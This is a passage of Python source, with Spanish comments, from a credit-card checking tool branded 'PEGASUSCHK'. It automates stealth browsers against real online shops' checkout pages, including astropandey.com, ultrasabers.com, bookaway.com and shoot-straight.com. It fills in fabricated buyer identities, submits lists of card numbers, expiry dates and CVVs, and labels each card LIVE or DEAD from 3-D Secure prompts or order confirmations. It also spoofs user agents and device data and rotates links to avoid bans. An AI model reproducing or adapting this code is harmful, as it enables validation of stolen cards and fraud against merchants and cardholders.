                            sb.switch_to_frame('#Cardinal-CCA-IFrame')
                            msgPay = sb.get_text('body')
                            sb.refresh()
                            sb.switch_to_default_content()
                        except:
                            sb.switch_to_default_content()
                            msgPay = sb.get_text('body > div > div.fcontent_rightside > h1:nth-child(2)', timeout=15)
                            print(msgPay) #  No se ha realizado el cobro
                        
                        sb.click('#backButton')
                        sb.click('#checkout_button')
                        
                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"

                        if self.tools.repetir(livemsg) == True:
                            msgPay = 'RELIVE'
                            deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                            self.text_dead.emit(deadmsg)
                        else:

                            if 'No se ha realizado el cobro' in msgPay:
                                self.text_dead.emit(deadmsg)
                            else:
                                ulti = self.ccs[self.cont][-4:]
                                palabras_clave = ["termina en", "hemos enviado", "el monto de", "mensaje de texto", "xxx-xxx-", "authorized cardholder", "passcode", "Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                                encontrada = any(palabra in msgPay for palabra in palabras_clave)
                                
                                if encontrada:
                                    self.text_live.emit(livemsg)
                                else:
                                    deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                                    self.text_dead.emit(deadmsg)

                            self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                            self.cont +=1
                            contador +=1

                        if self.tools.validate_creditos(self.username,self.password) == True:
                            self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                            break


                except Exception as e:

                    print('Error en configuracion de navegador.', e)
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message = (str(exc_type)+' '+str(exc_tb.tb_lineno))+' '+str(link)
                    self.printed.emit(error_message)

                self.text_changed.emit('ELIMINANDO RASTREADORES!')

        self.text_changed.emit('TESTEO FINALIZADO')

    except Exception as e:
        error_message = f"Error en Gates: {str(e)}"
        print(error_message)
        self.app.signal_error.emit(error_message)


def astropandey(self):

    self.cont = 0 
    createAccount = 1
    self.text_changed.emit("Iniciando OTP 3D Valid | INFINITY")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)


        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            # Determina la plataforma basada en el User-Agent

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                    return None

                self.email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                self.passwd = 'C2*#'+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789*#') for _ in range(8))
                self.phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                self.address = str(random.randint(100, 999)) + ' winding lake rd'

                try:
                    self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

                    sb.open("https://astropandey.com/product/shortconsultation/")

                    sb.click("#product-16897 > div.product-header > div.summary.entry-summary > form > button")
                    #sb.click("body > main > div > div > div.col-lg-4.pl-lg-4.sidebar-single-product > div.widget.woocommerce.widget_shopping_cart > div > div > p.woocommerce-mini-cart__buttons.buttons > a.button.checkout.wc-forward")
                    time.sleep(random.uniform(2, 3))
                    sb.open("https://astropandey.com/checkout/")

                    sb.type("#billing_first_name", self.first1)
                    sb.type("#billing_last_name", self.last1)
                    sb.select_option_by_value('#billing_country', 'US')
                    sb.type("#billing_address_1", self.address)
                    sb.type("#billing_city", "Sunrise")
                    sb.select_option_by_value('#billing_state', 'FL')
                    sb.type("#billing_postcode", "33351")
                    sb.type("#billing_phone", self.phone_number)
                    sb.type("#billing_email", self.email)

                    time.sleep(random.uniform(1, 3))

                    sb.click("#place_order")

                    #msg incomplete form #post-15 > div.post-inner > div > div > form.checkout.woocommerce-checkout > div.woocommerce-NoticeGroup.woocommerce-NoticeGroup-checkout

                    sb.wait_for_element('body > div.razorpay-container > iframe')
                    sb.switch_to_frame('body > div.razorpay-container > iframe')
                    time.sleep(random.uniform(4, 5))
                    sb.type("#main-stack-container > div > div > div > form > div.relative.flex.grow.flex-col.d\:grow-0 > div.mt-6.flex.flex-col > label > input", self.phone_number)
                    sb.click("#contact-submit > button")
                    
                    # INICIANDO PROCESO DE PAGO

                    contador = 0
                    while self.cont < self.total_lines and contador < 10:

                        self.text_changed.emit('El vuelo de Pegasus ha comenzado... 🐎 Reuniendo sabiduría. ⏳')

                        sb.click("#mobile-nav > div.overflow-hidden.rounded-xl.border.border-on-surface\/10.bg-surface.undefined > div > label:nth-child(1) > div > div")

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        deadmsg = f"DEAD|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"

                        sb.type("#main-stack-container > div > div > div > div > div.flex.flex-col.gap-6 > div > form > div:nth-child(1) > div:nth-child(1) > label > input", self.ccs[self.cont])
                        sb.type("#main-stack-container > div > div > div > div > div.flex.flex-col.gap-6 > div > form > div:nth-child(1) > div.relative.-mb-px.flex.first\:\*\:-mr-px > label:nth-child(1) > input", fecha)
                        sb.type("#main-stack-container > div > div > div > div > div.flex.flex-col.gap-6 > div > form > div:nth-child(1) > div.relative.-mb-px.flex.first\:\*\:-mr-px > label:nth-child(2) > input", self.cvv[self.cont])
                        time.sleep(random.uniform(1, 2))
                        sb.click("#dccCurrencyOption_COP")

                        original_window = sb.driver.current_window_handle
                        original_windows = sb.driver.window_handles

                        sb.click("#bottom-cta > div.flex.flex-wrap.items-center.gap-4.py-3 > button")

                        time.sleep(random.uniform(1, 2))

                        try:
                            sb.click("#razorpay-checkout-v2-container > div.z-\[60\] > div > div > div > div > div > div > div > div > div.w-full > button.flex.items-center.justify-center.rounded-lg.border.border-on-surface.border-opacity-10.bg-surface.text-on-surface.hover\:bg-surface-50.hover\:text-on-surface-50.p-3.font-heading.text-lg.h-11.font-semibold.active\:p-0.active\:pl-\[1px\].active\:pt-\[1px\].w-full", timeout=3)
                        except:
                            try:
                                sb.click("#razorpay-checkout-v2-container > div.z-\[60\] > div > div > div > div > section > section > div.px-6.pb-6.pt-3.d\:px-0 > form > div.mx-auto.w-full.d\:w-80.mb-4.mt-2.flex.justify-between.gap-2.text-base.font-medium.text-on-surface\/70 > button", timeout=3)
                            except: 
                                pass

                        time.sleep(random.uniform(3, 5))

                        start_time = time.time()
                        new_window = None

                        while time.time() - start_time < 20:  # Esperar mientras el tiempo transcurrido sea menor a 5 segundos

                            current_windows = sb.driver.window_handles
                            PA = str(len(current_windows))
                            PO = str(len(original_windows))
                            msg = f'PESTAÑAS ACTUALES: {PA}, PESTAÑAS ORIGINAL: {PO}'
                            self.text_changed.emit(msg)

                            if len(current_windows) > len(original_windows):

                                new_window = [window for window in current_windows if window not in original_windows][0]
                                time.sleep(1)
                                if new_window:
                                    sb.driver.switch_to.window(new_window)
                                    url = sb.get_current_url()
                                    if "authentication.cardinalcommerce.com/ThreeDSecure" in url:
                                        self.text_changed.emit('URL ENCONTRADA Y VALIDADA!')
                                        break
                            time.sleep(0.5)  # Pequeña demora antes de volver a chequear

                        if new_window == None:
                            url = sb.get_current_url()
                            if "authentication.cardinalcommerce.com/ThreeDSecure" in url:
                                self.text_changed.emit('URL ENCONTRADA Y VALIDADA!')
                            else:
                                self.text_changed.emit('BAN DE IP!')
                                return None
                
                        msgPay = sb.get_text("body")

                        ulti = self.ccs[self.cont][-4:]
                        palabras_clave = ["termina en", "hemos enviado", "el monto de", "mensaje de texto", "xxx-xxx-", "authorized cardholder", "passcode", "Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                        encontrada = any(palabra in msgPay for palabra in palabras_clave)
                                
                        if encontrada:
                            if self.tools.repetir(livemsg) == True:
                                self.text_dead.emit(deadmsg)
                            else:
                                self.text_live.emit(livemsg)
                        else:
                            self.text_dead.emit(deadmsg)

                        sb.click("#ExitLink")

                        sb.driver.switch_to.window(original_window)

                        sb.refresh()
                        sb.wait_for_element('body > div.razorpay-container > iframe')
                        sb.switch_to_frame('body > div.razorpay-container > iframe')
                        #msgPay = sb.get_text("#payment-status-modal > div > div > div > div.font-heading.font-semibold.text-xl.text-on-surface.text-center") 
                        # Payment could not be completed
                        #sb.click("#payment-status-modal > div > div > div > button")

                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        time.sleep(random.uniform(2, 3))

                        if self.tools.validate_creditos(self.username,self.password) == True:
                            self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                            break
                
                except Exception as e:
                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                    self.printed.emit(error_message)

            except Exception as e:
                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)

    self.text_changed.emit('TESTEO FINALIZADO')

def ultrasabers(self):

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            # Determina la plataforma basada en el User-Agent

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                    return None

                self.email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                self.passwd = 'C2*#'+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789*#') for _ in range(8))
                self.phone_number = f"5731{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                self.address = str(random.randint(100, 999)) + ' winding lake rd'
                fName = self.first1 + " " + self.last1

                links = [

                    "https://ultrasabers.com/product/color-discs/",
                    "https://ultrasabers.com/product/1-blade-plugs/",
                    "https://ultrasabers.com/product/two-piece-saber-stand/",
                    "https://ultrasabers.com/product/flush-silver-finish-coupler/"

                ]

                link = random.choice(links)

                try:

                    print('USER AGENT ACTUAL:', sb.get_user_agent())
                    sb.open(link)

                    sb.click("#add-to-cart")
                    sb.wait_for_element("#product-form > div.cart-results.active > div.cart-results-wrap > div > div.cta-wrap > a:nth-child(1)")
                    sb.open("https://ultrasabers.com/checkout/")

                    sb.type("#billing_email", self.email)
                    sb.type("#shipping_first_name", self.first1)
                    sb.type("#shipping_last_name", self.last1)
                    sb.type("#shipping_address_1", self.address)
                    sb.type("#shipping_postcode", "33351")

                    #shipping_state

                    sb.type("#shipping_city", "Sunrise")
                    sb.type("#shipping_phone", self.phone_number)
                    
                    self.text_changed.emit('El vuelo de Pegasus ha comenzado... 🐎 Reuniendo sabiduría. ⏳')

                    contador = 0

                    sb.click("#terms")

                    while self.cont < self.total_lines and contador < 11:

                        time.sleep(random.uniform(2, 3))

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"
                        
                        time.sleep(random.uniform(2, 3))
                        
                        selector = "#wc-authorize-net-cim-credit-card-account-number"
                        type_with_delay(sb, selector, self.ccs[self.cont], delay=1)

                        selector = "#wc-authorize-net-cim-credit-card-expiry"
                        type_with_delay(sb, selector, fecha, delay=1)

                        sb.type('#wc-authorize-net-cim-credit-card-csc', self.cvv[self.cont])

                        time.sleep(random.uniform(1, 3))

                        sb.click("#place_order")
                        
                        # Analizando resultados

                        time.sleep(random.uniform(2, 5))

                        try: 
                            msgPay = sb.get_text("#cfw-alert-container > div")
                            self.text_dead.emit(deadmsg)
                        except:
                            # REVISAR LIVE
                            msgPay = sb.get_current_url()
                            if "order-received" in msgPay:
                                if self.tools.repetir(livemsg) == True:
                                    self.text_dead.emit(deadmsg)
                                else:
                                    self.text_live.emit(livemsg)
                            self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                            self.cont +=1
                            contador +=1
                            break
                        
                        sb.refresh()
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        time.sleep(random.uniform(2, 4))

                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                        break
                
                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')



def bookaway(self):

    def createLink(self):
        try:

            self.text_changed.emit('El vuelo de Pegasus debe cargarse... 🐎 Esto tomara mas tiempo de lo habitual. ⏳')
            #fecha_hoy = datetime.now().strftime('%Y-%m-%d')
            #url_original = "https://www.bookaway.com/es/s/mexico/tulum-to-cancun?departuredate=2024-12-14&adult=1"
            #nueva_url = url_original.replace("departuredate=2024-12-02", f"departuredate={fecha_hoy}")
            #sb.open(nueva_url)
            
            sb.open("https://www.bookaway.com/es/routes/mexico/tulum-to-cancun/rt-wqqtsh6os59c?departuredate=2024-12-31&fromstation=651e77a2dd1917a1364f2951&tostation=651e77a2dd1917a1364f266a&adult=1&departuretime=1255AM")
            time.sleep(random.uniform(3, 7))
            #sb.click("(//a[@data-cy='search-card-header-clickable'])[2]", timeout=10)
            sb.click('//button[@data-cy="product-page-cta"]')
            sb.type("//input[@type='text' and @required]", self.first1)
            sb.type("(//input[@type='text' and @required])[2]", self.last1)
            sb.type("//input[@type='email' and @required]", email)
            sb.type("//input[@type='tel' and @required]", phone_number)
            #sb.type("//input[@id='react-select-3-input']", 'Pegasus123*')

            paisElement = sb.find_element("xpath", '//input[@id="react-select-2-input"]')
            sb.type("input#react-select-2-input", "Colombia")
            paisElement.send_keys(Keys.ENTER)

            sb.click('//*[@id="__next"]/div/div/div/div[2]/form/div[1]/section/div[4]/div[1]/div[2]/label/div/div/div/div/div/div')
            time.sleep(1)
            sb.click('#react-tiny-popover-container > div > div > a:nth-child(1) > div')

            sb.click("//button[@data-cy='checkout-cta']")

            time.sleep(random.uniform(5, 10))

            sb.click("//label[contains(text(), 'Agregar seguro')]", timeout=15)

            sb.click("//button[@data-cy='checkout-cta']", timeout=20)

            sb.wait_for_element("//button[@data-cy='book-ride-button']", timeout=20)

            url = sb.get_current_url()
            crawlerLink('LINK', url)
        
        except:
            self.text_changed.emit('ELIMINANDO RASTREADORES!') 
            exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" #+ link
            self.printed.emit(error_message)

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            # Determina la plataforma basada en el User-Agent

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                passwd = 'C2*#'+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789*#') for _ in range(8))
                phone_number = f"5731{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake rd'
                fName = self.first1 + " " + self.last1

                link = crawlerLink("GET", "")

                try:

                    print('USER AGENT ACTUAL:', sb.get_user_agent())
                    if self.username == "ZenoxPav":
                        createLink(self)
                    sb.open(link)

                    self.text_changed.emit('El vuelo de Pegasus ha comenzado... 🐎 Reuniendo sabiduría. ⏳')

                    contador = 0
                    msgPay = None

                    while self.cont < self.total_lines and contador < 4:

                        time.sleep(random.uniform(2, 3))
                        
                        #sb.wait_for_element("//iframe[contains(@title, 'entrada seguro del número de tarjeta')]")
                        sb.wait_for_element("//iframe[contains(@title, 'entrada seguro del número de tarjeta') or contains(@title, 'Secure card number input frame')]")

                        sb.type("//input[@data-cy='name-on-card-input']", fName)

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"
                        
                        sb.switch_to_frame("//iframe[contains(@title, 'entrada seguro del número de tarjeta') or contains(@title, 'Secure card number input frame')]")
                        sb.type('#root > form > span:nth-child(4) > div > div > div.CardNumberField-input-wrapper > span > input', self.ccs[self.cont])
                        sb.switch_to_default_content()

                        #sb.wait_for_element("//iframe[contains(@title, 'entrada seguro de la fecha')]")
                        sb.wait_for_element("//iframe[contains(@title, 'entrada seguro de la fecha') or contains(@title, 'Secure expiration date input frame')]")
                        sb.switch_to_frame("//iframe[contains(@title, 'entrada seguro de la fecha') or contains(@title, 'Secure expiration date input frame')]")
                        sb.type('#root > form > span:nth-child(4) > div > span > input', fecha)
                        sb.switch_to_default_content()

                        sb.wait_for_element("//iframe[contains(@title, 'CVC')]")
                        sb.switch_to_frame("//iframe[contains(@title, 'CVC')]")
                        sb.type('#root > form > span:nth-child(4) > div > span > input', self.cvv[self.cont])
                        time.sleep(random.uniform(1, 3))

                        sb.switch_to_default_content()

                        try:
                            sb.click("//div[@role='checkbox']", timeout=5)
                        except:
                            pass

                        try:
                            sb.click("#__next > div > div > div > div.jsx-1293382797.details-page.summary-first > form > div.jsx-3515225461.header-layout_fixed.header-padding.summary-first > div > div.jsx-42174565.action > div.jsx-439956053.action > button")
                        except:
                            sb.click("//button[contains(@title, 'Reservar') and contains(text(), 'Reservar este viaje')]")
                        # Analizando resultados

                        time.sleep(random.uniform(1, 3))

                        try:
                            msgPay = sb.get_text('//span[@class="text" and contains(text(), "sesión ha caducado")]', timeout=5)
                            if 'ha caducado' in msgPay:
                                # Eliminando Link
                                crawlerLink('DELETE', link)
                                createLink(self)
                        except:
                            try:
                                msgPay = sb.get_text('//span[@data-cy="undefined-error-message"]', timeout=5)
                                if contador == 0 and msgPay != None:
                                    createLink(self)
                            except:
                                sb.wait_for_element("body > div:nth-child(1) > iframe", timeout=15)
                                sb.switch_to_frame("body > div:nth-child(1) > iframe")
                                sb.wait_for_element("#challengeFrame", timeout=15)
                                sb.switch_to_frame("#challengeFrame")
                                msgPay = sb.get_text("body")
                            
                        print(msgPay)

                        ulti = self.ccs[self.cont][-4:]
                        palabras_clave = ["termina en", "hemos enviado", "el monto de", "mensaje de texto", "xxx-xxx-", "authorized cardholder", "passcode", "Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                        encontrada = any(palabra in msgPay for palabra in palabras_clave)
                        
                        if encontrada:
                            if self.tools.repetir(livemsg) == True:
                                self.text_dead.emit(deadmsg)
                            else:
                                if self.recheck == True:
                                    payitRecheck(self)
                                    #allhands(self)
                                else:
                                    self.text_live.emit(livemsg)
                        else:
                            self.text_dead.emit(deadmsg)

                        sb.switch_to_default_content()
                        
                        sb.refresh()
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        time.sleep(random.uniform(2, 4))

                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                        break
                
                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" #+ link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')


def pyChromeDev(self):


    if self.tools.validate_creditos(self.username,self.password) == True:
        self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
        return None
    
    self.cont = 0 
    createAccount = 2
    contadorBan = 0
    self.text_changed.emit("Iniciando Auth Valid | LEGACY")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, incognito=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })

            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('CREDITOS INSUFICIENTES :/')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                passwd = 'C2*#'+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789*#') for _ in range(8))
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'

                links = [

                    'https://www.shoot-straight.com/product/uncle-mikes-quick-detach-super-swivels-1-nickel-plated/',
                    'https://www.shoot-straight.com/product/bushnell-uncle-mikes-non-tri-lock/',
                    'https://www.shoot-straight.com/product/magpul-paraclip/',
                    'https://www.shoot-straight.com/product/magpul-ms3-single-qd-sling-gen-2-coyote-tan/',
                    'https://www.shoot-straight.com/product/blue-force-gear-rail-mounted-fixed-loop-rmfl/',
                    'https://www.shoot-straight.com/product/magpul-ms3-sling-gen-2-coy/',
                    'https://www.shoot-straight.com/product/blackhawk-storm-tactical-sling-70gs12bk/'

                ]

                link = random.choice(links)

                print('USER AGENT ACTUAL:', sb.get_user_agent())

                sb.open(link)

                sb.click('body > div.avwp-av > p:nth-child(4) > button.yes')
                try:
                    sb.click("//button[@name='add-to-cart']")
                except Exception as e:
                    if 'NoSuchElementException' in e:
                        print('Producto sin stock!', link)

                time.sleep(random.uniform(1, 3))
                url = 'shoot-straight.com/checkout/'
                sb.uc_open_with_reconnect(url, 2)
                sb.click("//button[contains(@class, 'pum-close')]")
                time.sleep(random.uniform(1, 3))

                # Form Checkout

                try:
                    sb.click('body > div.site-container > div.site-inner > div > main > article > div > div.woocommerce > div.woocommerce-form-login-toggle > div > a')
                except Exception as e:
                    print('Error en login.')

                sb.type('#billing_first_name', self.first1)
                sb.type('#billing_last_name', self.last1)
                sb.type('#billing_email', email)
                sb.type('#billing_phone', phone_number)
                sb.type('#billing_address_1', address)
                time.sleep(random.uniform(1, 3))
                sb.type('#billing_city', 'Sunrise')
                sb.type('#billing_postcode', '33351')
                sb.type('#account_password', 'Dinero123*')
                time.sleep(random.uniform(1, 3))

                contador = 0

                if self.cont == 19:
                    time.sleep(30)

                while self.cont < self.total_lines and contador < 10:

                    if contadorBan == 3:
                        self.text_changed.emit('BIN TEMPORALMENTE FUERA DE SERVICIO.')
                        return None


                    # CC FRAME

                    # Organizando data de CC
                    ccs, mes, ano, ccn, typ = (
                    str(self.ccs[self.cont]).strip(),
                    str(self.mes[self.cont]).strip(),
                    str(self.anio[self.cont]).strip(),
                    str(self.cvv[self.cont]).strip(),
                    self.tools.bintype(self.ccs[self.cont])
                    )

                    brand = self.ccs[self.cont][0:1]
                    binCC = self.ccs[self.cont][0:6]
                    fecha = f"{mes}{ano[2:4]}"

                    sb.type('#account_password', 'Dinero123*')

                    sb.wait_for_element('#wc-first-data-clover-credit-card-account-number-hosted > iframe')
                    sb.switch_to_frame('#wc-first-data-clover-credit-card-account-number-hosted > iframe')
                    sb.type('#cardNumber', self.ccs[self.cont])
                    sb.switch_to_default_content()

                    sb.wait_for_element('#wc-first-data-clover-credit-card-expiry-hosted > iframe')
                    sb.switch_to_frame('#wc-first-data-clover-credit-card-expiry-hosted > iframe')
                    sb.type('#date', fecha)
                    sb.switch_to_default_content()

                    sb.wait_for_element('#wc-first-data-clover-credit-card-csc-hosted > iframe')
                    sb.switch_to_frame('#wc-first-data-clover-credit-card-csc-hosted > iframe')
